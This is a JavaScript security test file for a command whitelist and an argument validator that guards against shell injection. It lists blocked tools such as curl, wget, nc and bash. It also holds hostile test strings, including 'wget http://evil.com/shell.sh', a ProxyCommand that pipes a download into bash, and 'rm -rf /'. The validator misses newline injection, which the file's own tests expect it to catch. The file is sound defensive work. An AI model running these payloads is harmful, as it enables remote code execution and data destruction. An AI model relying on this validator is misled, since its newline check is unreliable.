/**
 * Security Unit Tests - Secure Exec Module
 *
 * Tests the command execution whitelist and argument validation
 * to prevent command injection attacks.
 */

// Replicate the module logic for testing
const ALLOWED_COMMANDS = [
  'pandoc',
  'git',
  'code',
  'xdg-open',
  'open',
  'start'
]

const getBasename = (filepath) => {
  if (!filepath) return ''
  const parts = filepath.replace(/\\/g, '/').split('/')
  return parts[parts.length - 1] || ''
}

const isCommandAllowed = (command) => {
  if (!command || typeof command !== 'string') {
    return false
  }

  const baseCommand = getBasename(command).toLowerCase()

  return ALLOWED_COMMANDS.some(allowed => {
    return baseCommand === allowed ||
           baseCommand === `${allowed}.exe` ||
           baseCommand === `${allowed}.cmd`
  })
}

const areArgumentsSafe = (args) => {
  if (!Array.isArray(args)) {
    return false
  }

  const dangerousPatterns = [
    /[;&|`$()]/, // Shell operators
    /\.\.[/\\]/, // Directory traversal
    /^-.*oProxyCommand/i, // SSH proxy command injection
    /^-.*ProxyCommand/i
  ]

  return !args.some(arg => {
    if (typeof arg !== 'string') {
      return true // Non-string arguments are suspicious
    }
    return dangerousPatterns.some(pattern => pattern.test(arg))
  })
}

describe('Security - Command Whitelist', () => {
  describe('isCommandAllowed function', () => {
    // Whitelisted commands - should be allowed
    it('should allow pandoc', () => {
      expect(isCommandAllowed('pandoc')).to.equal(true)
    })

    it('should allow git', () => {
      expect(isCommandAllowed('git')).to.equal(true)
    })

    it('should allow code (VS Code)', () => {
      expect(isCommandAllowed('code')).to.equal(true)
    })

    it('should allow xdg-open (Linux)', () => {
      expect(isCommandAllowed('xdg-open')).to.equal(true)
    })

    it('should allow open (macOS)', () => {
      expect(isCommandAllowed('open')).to.equal(true)
    })

    it('should allow start (Windows)', () => {
      expect(isCommandAllowed('start')).to.equal(true)
    })

    // Windows executable variants
    it('should allow pandoc.exe (Windows)', () => {
      expect(isCommandAllowed('pandoc.exe')).to.equal(true)
    })

    it('should allow git.exe (Windows)', () => {
      expect(isCommandAllowed('git.exe')).to.equal(true)
    })

    it('should allow pandoc.cmd (Windows batch)', () => {
      expect(isCommandAllowed('pandoc.cmd')).to.equal(true)
    })

    // Full paths
    it('should allow /usr/bin/pandoc', () => {
      expect(isCommandAllowed('/usr/bin/pandoc')).to.equal(true)
    })

    it('should allow C:\\Program Files\\Pandoc\\pandoc.exe', () => {
      expect(isCommandAllowed('C:\\Program Files\\Pandoc\\pandoc.exe')).to.equal(true)
    })

    // Dangerous commands - should be blocked
    it('should block bash', () => {
      expect(isCommandAllowed('bash')).to.equal(false)
    })

    it('should block sh', () => {
      expect(isCommandAllowed('sh')).to.equal(false)
    })

    it('should block cmd', () => {
      expect(isCommandAllowed('cmd')).to.equal(false)
    })

    it('should block powershell', () => {
      expect(isCommandAllowed('powershell')).to.equal(false)
    })

    it('should block curl', () => {
      expect(isCommandAllowed('curl')).to.equal(false)
    })

    it('should block wget', () => {
      expect(isCommandAllowed('wget')).to.equal(false)
    })

    it('should block rm', () => {
      expect(isCommandAllowed('rm')).to.equal(false)
    })

    it('should block del', () => {
      expect(isCommandAllowed('del')).to.equal(false)
    })

    it('should block nc (netcat)', () => {
      expect(isCommandAllowed('nc')).to.equal(false)
    })

    it('should block python', () => {
      expect(isCommandAllowed('python')).to.equal(false)
    })

    it('should block node', () => {
      expect(isCommandAllowed('node')).to.equal(false)
    })

    // Edge cases
    it('should reject null command', () => {
      expect(isCommandAllowed(null)).to.equal(false)
    })

    it('should reject undefined command', () => {
      expect(isCommandAllowed(undefined)).to.equal(false)
    })

    it('should reject empty string', () => {
      expect(isCommandAllowed('')).to.equal(false)
    })

    it('should reject non-string values', () => {
      expect(isCommandAllowed(123)).to.equal(false)
      expect(isCommandAllowed({})).to.equal(false)
    })
  })
})

describe('Security - Argument Validation', () => {
  describe('areArgumentsSafe function', () => {
    // Safe arguments
    it('should allow empty array', () => {
      expect(areArgumentsSafe([])).to.equal(true)
    })

    it('should allow simple string arguments', () => {
      expect(areArgumentsSafe(['--version'])).to.equal(true)
    })

    it('should allow file paths', () => {
      expect(areArgumentsSafe(['/path/to/file.md', '--output', 'output.pdf'])).to.equal(true)
    })

    it('should allow typical pandoc arguments', () => {
      expect(areArgumentsSafe([
        '-f', 'markdown',
        '-t', 'pdf',
        '-o', 'output.pdf',
        'input.md'
      ])).to.equal(true)
    })

    // Dangerous arguments - shell operators
    it('should block semicolon (command chaining)', () => {
      expect(areArgumentsSafe(['file.md; rm -rf /', 'output.pdf'])).to.equal(false)
    })

    it('should block ampersand (background execution)', () => {
      expect(areArgumentsSafe(['file.md & malicious &', 'output.pdf'])).to.equal(false)
    })

    it('should block pipe (output redirection)', () => {
      expect(areArgumentsSafe(['file.md | cat /etc/passwd'])).to.equal(false)
    })

    it('should block backticks (command substitution)', () => {
      expect(areArgumentsSafe(['`whoami`'])).to.equal(false)
    })

    it('should block dollar sign with parens (command substitution)', () => {
      expect(areArgumentsSafe(['$(whoami)'])).to.equal(false)
    })

    it('should block parentheses (subshell)', () => {
      expect(areArgumentsSafe(['(malicious command)'])).to.equal(false)
    })

    // Directory traversal
    it('should block ../ (Unix directory traversal)', () => {
      expect(areArgumentsSafe(['../../../etc/passwd'])).to.equal(false)
    })

    it('should block ..\\ (Windows directory traversal)', () => {
      expect(areArgumentsSafe(['..\\..\\..\\windows\\system32'])).to.equal(false)
    })

    // SSH proxy command injection
    it('should block -oProxyCommand', () => {
      expect(areArgumentsSafe(['-oProxyCommand=whoami'])).to.equal(false)
    })

    it('should block -ProxyCommand', () => {
      expect(areArgumentsSafe(['-ProxyCommand=whoami'])).to.equal(false)
    })

    // Edge cases
    it('should reject non-array input', () => {
      expect(areArgumentsSafe('--version')).to.equal(false)
      expect(areArgumentsSafe(null)).to.equal(false)
      expect(areArgumentsSafe(undefined)).to.equal(false)
    })

    it('should reject arrays with non-string elements', () => {
      expect(areArgumentsSafe([123, '--version'])).to.equal(false)
      expect(areArgumentsSafe([{}, '--output'])).to.equal(false)
      expect(areArgumentsSafe([null, 'file.md'])).to.equal(false)
    })
  })
})

describe('Security - Command Injection Prevention', () => {
  describe('Common injection attempts', () => {
    const injectionAttempts = [
      ['file.md; curl http://evil.com'],
      ['file.md && rm -rf /'],
      ['file.md || wget http://evil.com/shell.sh'],
      ['$(cat /etc/passwd)'],
      ['`cat /etc/passwd`'],
      ['file.md\nwhoami'],
      ['file.md\r\nwhoami'],
      ['-oProxyCommand=curl http://evil.com/shell.sh | bash'],
      ['../../../../../etc/passwd'],
      ['file.md & start cmd.exe'],
      ['file.md | powershell -c "malicious"']
    ]

    injectionAttempts.forEach((args, index) => {
      it(`should block injection attempt ${index + 1}: ${args[0].substring(0, 30)}...`, () => {
        expect(areArgumentsSafe(args)).to.equal(false)
      })
    })
  })

  describe('Combined command and argument validation', () => {
    it('should block dangerous command even with safe arguments', () => {
      const command = 'bash'
      const args = ['--version']
      expect(isCommandAllowed(command)).to.equal(false)
    })

    it('should block safe command with dangerous arguments', () => {
      const command = 'pandoc'
      const args = ['file.md; rm -rf /']
      expect(isCommandAllowed(command)).to.equal(true)
      expect(areArgumentsSafe(args)).to.equal(false)
    })

    it('should allow safe command with safe arguments', () => {
      const command = 'pandoc'
      const args = ['-f', 'markdown', '-t', 'pdf', 'input.md']
      expect(isCommandAllowed(command)).to.equal(true)
      expect(areArgumentsSafe(args)).to.equal(true)
    })
  })
})
